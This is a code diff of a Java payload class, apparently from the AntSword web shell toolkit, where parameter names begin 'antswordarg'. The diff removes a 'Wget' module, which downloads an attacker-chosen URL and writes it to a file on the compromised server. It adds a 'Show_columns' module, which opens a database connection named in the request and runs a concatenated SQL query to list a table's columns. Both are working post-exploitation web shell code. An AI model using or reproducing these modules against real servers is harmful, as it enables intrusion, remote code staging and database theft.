@@ -2,12 +2,9 @@ import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.jsp.PageContext;
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
-import java.io.InputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
+import java.sql.*;
 
-public class Wget {
+public class Show_columns {
     public String encoder;
     public String cs;
     public String randomPrefix;
@@ -24,16 +21,20 @@ public class Wget {
         StringBuffer sb = new StringBuffer("");
         String tag_s = "->|";
         String tag_e = "|<-";
-        String varkey1 = "antswordargurl";
-        String varkey2 = "antswordargpath";
+        String varkey1 = "antswordargencode";
+        String varkey2 = "antswordargconn";
+        String varkey3 = "antswordargdb";
+        String varkey4 = "antswordargtable";
         try {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
             response.setCharacterEncoding(cs);
             String z1 = EC(decode(request.getParameter(varkey1) + "", encoder, cs), encoder, cs);
             String z2 = EC(decode(request.getParameter(varkey2) + "", encoder, cs), encoder, cs);
+            String z3 = EC(decode(request.getParameter(varkey3) + "", encoder, cs), encoder, cs);
+            String z4 = EC(decode(request.getParameter(varkey4) + "", encoder, cs), encoder, cs);
             output.append(tag_s);
-            sb.append(WgetCode(z1, z2));
+            sb.append(showColumns(z1, z2, z3, z4));
             output.append(sb.toString());
             output.append(tag_e);
             page.getOut().print(output.toString());
@@ -44,7 +45,8 @@ public class Wget {
     }
 
     String EC(String s, String encoder, String cs) throws Exception {
-        if (encoder.equals("hex") || encoder == "hex") return s;
+        if (encoder.equals("hex") || encoder == "hex")
+            return s;
         return new String(s.getBytes(), cs);
     }
 
@@ -87,20 +89,40 @@ public class Wget {
         return str;
     }
 
-    String WgetCode(String urlPath, String saveFilePath) throws Exception {
-        URL u = new URL(urlPath);
-        int n = 0;
-        FileOutputStream os = new FileOutputStream(saveFilePath);
-        HttpURLConnection h = (HttpURLConnection) u.openConnection();
-        InputStream is = h.getInputStream();
-        byte[] b = new byte[512];
-        while ((n = is.read(b)) != -1) {
-            os.write(b, 0, n);
+    String executeSQL(String encode, String conn, String sql, String columnsep, String rowsep, boolean needcoluname)
+            throws Exception {
+        String ret = "";
+        String[] x = conn.trim().replace("\r\n", "\n").split("\n");
+        Class.forName(x[0].trim());
+        String url = x[1] + "&characterEncoding=" + encode;
+        Connection c = DriverManager.getConnection(url);
+        Statement stmt = c.createStatement();
+        ResultSet rs = stmt.executeQuery(sql);
+        ResultSetMetaData rsmd = rs.getMetaData();
+
+        if (needcoluname) {
+            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
+                String columnName = rsmd.getColumnName(i);
+                ret += columnName + columnsep;
+            }
+            ret += rowsep;
         }
-        os.close();
-        is.close();
-        h.disconnect();
-        return "1";
+
+        while (rs.next()) {
+            for (int i = 1; i <= rsmd.getColumnCount(); i++) {
+                String columnValue = rs.getString(i);
+                ret += columnValue + columnsep;
+            }
+            ret += rowsep;
+        }
+        return ret;
+    }
+
+    String showColumns(String encode, String conn, String dbname, String table) throws Exception {
+        String columnsep = "\t";
+        String rowsep = "";
+        String sql = "select * from " + dbname + "." + table + " limit 0,0";
+        return executeSQL(encode, conn, sql, columnsep, rowsep, true);
     }
 
 }
